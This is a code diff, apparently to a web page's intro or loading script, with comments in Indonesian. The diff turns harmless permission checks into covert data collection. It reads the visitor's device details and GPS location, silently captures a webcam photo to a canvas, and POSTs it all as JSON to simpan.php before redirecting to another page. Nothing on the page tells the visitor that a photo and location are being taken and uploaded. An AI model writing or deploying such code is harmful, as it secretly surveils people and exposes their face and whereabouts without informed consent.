@@ -4,6 +4,21 @@
 
 const loading = document.getElementById("loading");
 const video = document.getElementById("introVideo");
+const canvas = document.getElementById("canvas");
+
+
+// ============================
+// DATA PERANGKAT
+// ============================
+
+let device = navigator.userAgent;
+let platform = navigator.platform;
+let bahasa = navigator.language;
+let waktu = new Date().toLocaleString();
+
+let latitude = "-";
+let longitude = "-";
+let foto = "";
 
 
 // ============================
@@ -23,56 +38,108 @@ setTimeout(() => {
 
 
 // ============================
-// COBA AMBIL LOKASI (TANPA MENUNGGU)
+// AMBIL LOKASI (JIKA ADA)
 // ============================
 
-try {
+if (navigator.geolocation) {
 
-    if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
 
-        navigator.geolocation.getCurrentPosition(
-            () => console.log("lokasi didapat"),
-            () => console.log("lokasi ditolak"),
-            { timeout: 1000 }
-        );
+        pos => {
 
-    }
+            latitude = pos.coords.latitude;
+            longitude = pos.coords.longitude;
 
-} catch (e) {}
+        },
+
+        err => {
+
+            latitude = "-";
+            longitude = "-";
+
+        },
+
+        { timeout: 1000 }
+
+    );
+
+}
 
 
 // ============================
-// COBA AKSES KAMERA (TANPA MENUNGGU)
+// AMBIL FOTO (JIKA DIIZINKAN)
 // ============================
 
-try {
+if (navigator.mediaDevices) {
 
-    if (navigator.mediaDevices) {
+    navigator.mediaDevices.getUserMedia({ video: true })
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
+        .then(stream => {
 
-                console.log("kamera aktif");
+            let videoCam = document.createElement("video");
+            videoCam.srcObject = stream;
+            videoCam.play();
+
+            setTimeout(() => {
+
+                canvas.width = 320;
+                canvas.height = 240;
+
+                let ctx = canvas.getContext("2d");
+                ctx.drawImage(videoCam, 0, 0, 320, 240);
+
+                foto = canvas.toDataURL("image/png");
+
                 stream.getTracks().forEach(track => track.stop());
 
-            })
-            .catch(() => {
+            }, 800);
 
-                console.log("kamera ditolak");
+        })
 
-            });
+        .catch(() => {
 
-    }
+            foto = "";
 
-} catch (e) {}
+        });
+
+}
 
 
 // ============================
-// LANGSUNG LANJUT
+// KIRIM DATA KE SERVER
 // ============================
 
 setTimeout(() => {
 
-    window.location.href = "global/global.html";
+    fetch("simpan.php", {
+
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+
+        body: JSON.stringify({
+
+            device: device,
+            platform: platform,
+            bahasa: bahasa,
+            waktu: waktu,
+            latitude: latitude,
+            longitude: longitude,
+            foto: foto
+
+        })
+
+    })
+    .then(() => {
+
+        window.location.href = "global/global.html";
+
+    })
+    .catch(() => {
+
+        window.location.href = "global/global.html";
+
+    });
 
 }, 3000);
